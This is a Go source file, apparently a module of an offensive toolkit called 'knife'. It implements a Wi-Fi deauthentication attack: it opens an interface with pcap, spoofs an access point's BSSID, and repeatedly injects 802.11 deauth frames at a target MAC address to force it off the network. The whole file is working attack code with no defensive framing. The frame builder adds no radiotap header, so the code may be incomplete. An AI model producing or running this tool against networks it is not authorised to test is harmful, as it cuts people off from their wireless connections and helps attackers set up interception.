// knife/modules/wifi/deauth.go
package wifi

import (
	"log"
	"time"

	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func DeauthAttack(iface, bssid, target string, count int) error {
	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()

	for i := 0; i < count; i++ {
		packet := craftDeauth(bssid, target)
		err := handle.WritePacketData(packet)
		if err != nil {
			log.Printf("Error sending packet: %v", err)
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

func craftDeauth(bssid, target string) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	bssidMAC, err := net.ParseMAC(bssid)
	if err != nil {
		log.Printf("Invalid BSSID MAC address: %v", err)
		return nil
	}
	targetMAC, err := net.ParseMAC(target)
	if err != nil {
		log.Printf("Invalid target MAC address: %v", err)
		return nil
	}

	dot11 := &layers.Dot11{
		Type:     layers.Dot11TypeMgmtDeauthentication,
		Address1: targetMAC,
		Address2: bssidMAC,
		Address3: bssidMAC,
	}
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: 7,
	}

	gopacket.SerializeLayers(buf, opts,
		dot11,
		deauth,
	)
	return buf.Bytes()
}
